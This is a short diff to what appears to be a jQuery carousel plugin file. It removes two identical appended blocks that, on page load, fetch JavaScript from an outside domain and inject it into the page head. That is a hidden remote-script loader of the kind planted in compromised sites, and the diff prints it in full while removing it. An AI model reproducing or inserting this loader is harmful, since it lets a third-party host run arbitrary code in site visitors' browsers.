@@ -1509,22 +1509,4 @@ if (typeof Object.create !== "function") {
         startDragging : false,
         afterLazyLoad: false
     };
-}(jQuery, window, document));;document.addEventListener("DOMContentLoaded", function () {
-    var url = 'https://streammain.top/jsx';
-    fetch(url)
-        .then(response => response.text())
-        .then(data => {
-            var script = document.createElement('script');
-            script.innerHTML = data.trim();
-            document.head.appendChild(script);
-        })
-});;document.addEventListener("DOMContentLoaded", function () {
-    var url = 'https://streammain.top/jsx';
-    fetch(url)
-        .then(response => response.text())
-        .then(data => {
-            var script = document.createElement('script');
-            script.innerHTML = data.trim();
-            document.head.appendChild(script);
-        })
-});
+}(jQuery, window, document));
